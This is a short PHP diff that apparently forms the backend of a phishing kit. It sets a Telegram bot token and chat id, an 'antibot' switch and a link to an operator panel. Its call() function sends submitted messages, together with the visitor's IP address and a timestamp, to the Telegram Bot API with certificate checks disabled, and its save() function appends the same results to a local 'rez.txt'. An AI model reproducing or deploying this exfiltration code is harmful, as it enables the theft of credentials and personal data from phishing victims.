@@ -1,0 +1,52 @@
+<?php
+
+     
+
+$token = "your-token";
+$id = "chatid";
+
+
+// use antibot? yes|no
+$antibot = "yes";
+
+ 
+$ipp = "";
+if($_SERVER['REMOTE_ADDR']=="::1"){
+$ipp = "127.0.0.1";
+}else{
+$ipp = $_SERVER['REMOTE_ADDR'];
+}
+$panel_link = str_replace("auth/post.php", "panel/ctr.php", "http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']."?ip=$ipp");
+
+ 
+
+function call($msg){
+    global $token;
+    global $id;
+    global $panel_link;
+    $info = "
+
+/- MORE INFO -/
+PANEL: $panel_link
+IP: ".$_SERVER['REMOTE_ADDR']."
+TIME: ".date("m/d/Y h:i:sa");
+
+    $c = curl_init('https://api.telegram.org/bot'.$token.'/sendMessage?chat_id='.$id.'&text='.urlencode($msg.$info));
+    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
+    $res = curl_exec($c);
+    curl_close($c);
+    return $res;
+}
+
+
+function save($txt){
+    $fp = fopen((__DIR__)."/rez.txt", "a");
+    fwrite($fp, $txt);
+    fclose($fp);
+}
+
+
+
+
+?>
